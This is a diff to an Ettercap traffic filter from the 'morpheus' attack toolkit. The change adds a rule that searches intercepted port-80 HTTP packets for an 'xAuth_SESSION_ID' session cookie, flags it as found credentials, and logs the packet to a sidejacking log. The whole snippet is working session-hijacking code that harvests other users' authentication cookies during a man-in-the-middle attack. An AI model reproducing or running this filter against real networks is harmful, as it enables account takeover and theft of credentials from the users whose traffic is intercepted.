@@ -51,6 +51,14 @@ if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
     msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
     log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
   }else{
+  if (search(DATA.data, "xAuth_SESSION_ID")) {
+    msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
+    msg("[morpheus] | status: AuthCookie detected ☠");
+    msg("[morpheus] |  port : 80/TCP authentication ✔");
+    msg("[morpheus] |  info : credentials found, log stored ✔");
+    msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
+    log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
+  }else{
   if (search(DATA.data, "UsErInPut")) {
     msg("\n[morpheus] host:TaRgEt   [ ⊶ ]   found...");
     msg("[morpheus] | status: AuthCookie detected ☠");
@@ -58,6 +66,7 @@ if (ip.proto == TCP && tcp.src == 80 || tcp.dst == 80) {
     msg("[morpheus] |  info : credentials found, log stored ✔");
     msg("[morpheus] |_ log  : morpheus/logs/sidejacking.log!\n");
     log(DECODED.data, "./sidejacking.log"); # note: morpheus/logs/sidejacking.log
+  }
   }
   }
   }
